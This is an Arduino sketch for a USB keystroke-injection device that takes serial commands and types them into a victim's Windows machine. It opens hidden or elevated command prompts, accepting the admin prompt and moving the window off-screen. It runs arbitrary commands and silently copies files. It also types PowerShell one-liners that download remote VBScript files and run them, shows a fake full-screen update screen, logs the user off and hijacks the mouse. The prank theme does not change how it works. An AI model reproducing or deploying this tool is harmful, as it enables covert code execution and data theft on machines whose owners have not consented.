#include "Keyboard.h"
#include "Mouse.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  Keyboard.begin();
  Mouse.begin();
  delay(500);
  //Keyboard.end();
}


boolean Hacking = false;

/* Unused endless loop */
void loop() {  
  if (Serial.available()) {
    String Text = Serial.readString();
    if(Text.indexOf("PC") != -1){
      String I, O = "";
      I = Text.substring(Text.indexOf(" ")+1, Text.indexOf("->"));
      O = Text.substring(Text.indexOf("->")+2);
      PenCopy(I, O);
    }else if(Text.indexOf("CX") != -1){
      String Command = "";
      boolean Adm = false;
      boolean Exit = true;
      boolean Open = true;
      boolean Hide = false;
      boolean Minimize = true;
      int FlagPos = Text.indexOf("-flags")+6;
      Command = Text.substring(Text.indexOf(" ")+1, FlagPos-7);
      Command = ParseEnglish(Command);
      if(Text.indexOf("-a") > FlagPos){
        Adm = true;
      }
      if(Text.indexOf("-e") > FlagPos){
        Exit = false;
      }
      if(Text.indexOf("-o") > FlagPos){
        Open = false;
      }
      if(Text.indexOf("-h") > FlagPos){
        Hide = true;
      }
      if(Text.indexOf("-m") > FlagPos){
        Minimize = false;
      }
      ExeCommand(Open, Command, Adm, Exit, Hide, Minimize);
    }else if(Text.indexOf("WL") != -1){
      Keyboard.print(ParseEnglish(Text.substring(Text.indexOf(" ")+1)));
    }else if(Text.indexOf("RT") != -1){
      typeKey(KEY_RETURN);
    }else if(Text.indexOf("RR") != -1){
      RickRoll();
    }else if(Text.indexOf("SK") != -1){
      Skillet();
    }else if(Text.indexOf("LO") != -1){
      LogOff();
    }else if(Text.indexOf("SM") != -1){
      StopMusic();
    }

    if(Text.indexOf("SH") != -1){
      if(Hacking){
        Hacking = false;
      }else{
        Hacking = true;
      }
    }
    
  }

  if(Hacking){
    RetainMouse();
  }
  
  delay(2500);
}

void CmdStartAdmin(boolean Hide){
  delay(500);

  typeKey(KEY_LEFT_GUI);

  delay(1000);

  Keyboard.print("cmd &Q &D &T>7F &F>OFF &V>ON &K");

  delay(3000);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(4000);

  typeKey(KEY_LEFT_ARROW);

  delay(500);

  typeKey(KEY_RETURN);

  delay(3000);

  if(Hide){
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(' ');
    Keyboard.releaseAll();
  
    Keyboard.print("M");
  
    for(int i = 0; i < 100; i++) {
      typeKey(KEY_LEFT_ARROW);
    }
  
    typeKey(KEY_RETURN);
  }
}

void CmdStart(boolean Hide){
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(2000);

  Keyboard.print("cmd &Q &D &T>7F &F>OFF &V>ON &K");

  delay(500);

  typeKey(KEY_RETURN);

  delay(2000);

  if(Hide){
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(' ');
    Keyboard.releaseAll();
  
    Keyboard.print("M");
  
    for(int i = 0; i < 100; i++) {
      typeKey(KEY_LEFT_ARROW);
    }
  
    typeKey(KEY_RETURN);
  }
}

void Minimize(){
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(' ');
  Keyboard.releaseAll();
  Keyboard.print("N");
}

void PenCopy(String I, String O){
  CmdStart(false);
  Keyboard.print("xcopy @"+I+">&@ @"+O+">&Copied@ &H &S &E &Y &C &Q &Z &I ^ exit");
  typeKey(KEY_RETURN);
  Minimize();
}

void ExeCommand(boolean opn, String cmd, boolean adm, boolean Exit, boolean hide, boolean minimize){
  if(opn){
    if(adm){
      CmdStartAdmin(hide);
    }else{
      CmdStart(hide);
    }
  }
  if(Exit){
    Keyboard.print(cmd+" ^ exit");
  }else{
    Keyboard.print(cmd);
  }
  typeKey(KEY_RETURN);
  if(minimize){
    Minimize();
  }
}

String ParseEnglish(String str){
  //str.replace("º", "`");
  str.replace("ª", "~");
  str.replace("\"", "@");
  //str.replace("·", "#");
  str.replace("^", "{");
  str.replace("&", "^");
  str.replace("/", "&");
  str.replace("*", "}");
  str.replace("(", "*");
  str.replace(")", "(");
  str.replace("=", ")");
  str.replace("-", "/");
  str.replace("'", "-");
  //str.replace("¡", "=");
  str.replace("¿", "+");
  //str.replace("`", "[");
  str.replace("+", "]");
  str.replace("´", "'");
  str.replace("ç", "\\");
  str.replace("Ç", "|");
  str.replace("ñ", ";");
  str.replace("¨", "\"");
  str.replace(";", "<");
  str.replace(":", ">");
  
  /*Sin equivalencia
  str.replace("\\", "");
  str.replace("[", "");
  str.replace("]", "");
  str.replace("{", "");
  str.replace("}", "");
  str.replace("|", "");
  str.replace("@", "");
  str.replace("#", "");
  str.replace("~", "");
  str.replace("€", "");
  str.replace("¬", "");
  str.replace("<", "");
  str.replace(">", "");
  */
  
  /*Useless
  str.replace("!", "!");
  str.replace("$", "$");
  str.replace("%", "%");
  str.replace(",", ",");
  str.replace(".", ".");
  */
  
  return str;
}

void RickRoll(){
  CmdStartAdmin(false);
  String s = ParseEnglish("powershell (new-object System.Net.WebClient).DownloadFile('https://gitlab.com/WarKitteh/arduino-hid-rickroll/raw/cee63bb220c856587462b29d61bdfc70c806805f/rickroll.vbs','%userprofile%/rickroll.vbs'); && start %userprofile%/rickroll.vbs && exit");
  Keyboard.print(s);
  typeKey(KEY_RETURN);
  Minimize();
}

void Skillet(){
  FakeReboot();
  CmdStartAdmin(false);
  String s = ParseEnglish("powershell (new-object System.Net.WebClient).DownloadFile('https://firebasestorage.googleapis.com/v0/b/arduino-9e1fa.appspot.com/o/skillet.vbs_alt=media','%userprofile%/skillet.vbs'); && start %userprofile%/skillet.vbs && exit");
  Keyboard.print(s);
  typeKey(KEY_RETURN);
  Minimize();
}

void FakeReboot(){
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(2000);

  Keyboard.print(ParseEnglish("chrome.exe --start-maximized --app=http://fakeupdate.net/win7/index.html"));

  delay(500);

  typeKey(KEY_RETURN);

  delay(5000);

  typeKey(KEY_F11);
}

void LogOff(){
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(2500);

  Keyboard.print(ParseEnglish("shutdown /l"));

  delay(500);

  typeKey(KEY_RETURN);
}

void StopMusic(){
  CmdStartAdmin(false);
  Keyboard.print(ParseEnglish("taskkill /F /IM wscript.exe && exit"));
  delay(500);
  typeKey(KEY_RETURN);
  Minimize();
}

void RetainMouse(){
  Mouse.move(127, -127, 0);
  Mouse.move(127, -127, 0);
  Mouse.move(127, -127, 0);
  Mouse.move(127, -127, 0);
  Mouse.move(127, -127, 0);
  Mouse.move(127, -127, 0);
}

